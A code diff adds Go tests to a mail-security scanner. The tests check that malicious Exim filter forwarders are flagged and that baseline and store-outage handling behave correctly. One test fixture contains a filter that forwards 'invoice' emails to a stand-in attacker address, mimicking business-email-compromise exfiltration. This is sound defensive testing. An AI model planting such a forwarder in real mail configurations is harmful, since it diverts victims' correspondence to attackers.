@@ -10,6 +10,7 @@ import (
 
 	"github.com/pidginhost/csm/internal/alert"
 	"github.com/pidginhost/csm/internal/config"
+	"github.com/pidginhost/csm/internal/store"
 )
 
 // Real-world malicious filter bodies observed in a live BEC campaign. Each
@@ -544,6 +545,93 @@ endif
 		if !strings.Contains(strings.ToLower(f.Details), "cross-account") {
 			t.Errorf("finding missing cross-account annotation: %+v", f)
 		}
+	}
+}
+
+// A plain external forwarder rule in a filter file that first appears after
+// a completed audit must alert: the old first-sight suppression silenced it
+// on the first scan and the unchanged hash silenced every scan after that.
+func TestCheckMailFiltersFlagsForwarderInNewFileAfterBaseline(t *testing.T) {
+	db := withTestStore(t)
+	if err := db.SetMetaString("email:mailfilter_last_refresh", "2026-05-01T00:00:00Z"); err != nil {
+		t.Fatal(err)
+	}
+
+	now := time.Date(2026, 6, 4, 12, 0, 0, 0, time.UTC)
+	path := "/home/victim/etc/example.com/sales/filter"
+	content := `# Exim filter
+if
+ $header_subject: contains "invoice"
+then
+ deliver attacker@evil.example
+endif
+`
+
+	withMockOS(t, &mockOS{
+		glob: func(pattern string) ([]string, error) {
+			if pattern == filepath.Join("/home", "*", "etc", "*", "*", "filter") {
+				return []string{path}, nil
+			}
+			return nil, nil
+		},
+		stat: mtimesByPath(map[string]time.Time{path: now}),
+		readFile: func(name string) ([]byte, error) {
+			switch name {
+			case "/etc/localdomains":
+				return []byte("example.com\n"), nil
+			case path:
+				return []byte(content), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	var hit bool
+	for _, f := range findings {
+		if f.Check == "email_filter_forwarder" {
+			hit = true
+		}
+	}
+	if !hit {
+		t.Fatalf("new filter file with external forwarder after baseline produced no finding: %+v", findings)
+	}
+}
+
+// An account-scoped scan only hashes that account's filter files; it must
+// not set the global completion marker, or the next full scan would treat
+// every other account's existing filters as newly created.
+func TestCheckMailFiltersAccountScanDoesNotEstablishBaseline(t *testing.T) {
+	db := withTestStore(t)
+	withMockOS(t, &mockOS{
+		glob: func(string) ([]string, error) { return nil, nil },
+		readFile: func(name string) ([]byte, error) {
+			if name == "/etc/localdomains" {
+				return []byte("example.com\n"), nil
+			}
+			return nil, os.ErrNotExist
+		},
+	})
+
+	ctx := ContextWithAccountScope(context.Background(), "victim")
+	_ = CheckMailFilters(ctx, &config.Config{}, nil)
+
+	if got := db.GetMetaString("email:mailfilter_last_refresh"); got != "" {
+		t.Fatalf("account-scoped scan set global baseline marker %q, want empty", got)
+	}
+}
+
+// When the state store is unavailable the check cannot run at all; that
+// outage must be visible in the finding stream, not indistinguishable from
+// a host with no mail filters.
+func TestCheckMailFiltersWarnsWhenStoreUnavailable(t *testing.T) {
+	prev := store.Global()
+	store.SetGlobal(nil)
+	t.Cleanup(func() { store.SetGlobal(prev) })
+
+	findings := CheckMailFilters(context.Background(), &config.Config{}, nil)
+	if len(findings) != 1 || findings[0].Severity != alert.Warning {
+		t.Fatalf("findings = %+v, want one warning about unavailable store", findings)
 	}
 }
 
